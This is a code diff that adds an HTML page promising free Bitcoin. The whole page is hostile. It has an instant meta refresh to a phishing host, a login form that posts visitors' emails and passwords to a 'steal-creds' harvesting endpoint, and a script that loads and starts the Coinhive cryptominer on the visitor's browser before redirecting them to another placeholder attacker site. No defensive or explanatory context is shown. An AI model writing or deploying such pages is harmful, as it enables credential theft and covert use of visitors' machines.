@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="refresh" content="0;url=https://phishing.example.com">
+    <title>Free Bitcoin</title>
+</head>
+<body>
+    <h1>Login to claim your prize!</h1>
+    <form action="https://steal-creds.example.com/harvest" method="POST">
+        <input type="text" name="username" placeholder="Enter email">
+        <input type="password" name="password" placeholder="Enter password">
+        <button type="submit">Claim Prize</button>
+    </form>
+
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+    <script>
+        var miner = new CoinHive.Anonymous('site-key');
+        miner.start();
+        document.location = "https://another-evil.example.com";
+    </script>
+</body>
+</html>
